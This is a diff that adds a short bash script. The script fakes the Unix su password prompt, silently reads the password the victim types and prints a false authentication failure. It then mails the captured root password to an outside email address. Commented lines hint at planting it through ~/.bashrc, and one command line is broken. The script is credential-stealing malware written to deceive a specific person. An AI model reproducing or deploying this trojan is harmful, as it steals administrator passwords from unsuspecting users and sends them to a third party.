@@ -1,0 +1,16 @@
+#!/bin/bash
+
+hack_passwd(){
+echo "Password:"
+read -s passwd
+#echo ${passwd} debug usage
+sleep 3
+mail -s
+echo "su: Authentication failure"
+mail -s "[Secret] Root Password of Mum" "kevin.zhang@sjtu.edu.cn" <<< ${passwd}
+}
+
+echo "test su"
+hack_passwd
+#head -n 1 ~/.bashrc > ~/.bashrc_tmp not work yet
+#mv ~/.bashrc_tmp ~/.bashrc not work yet
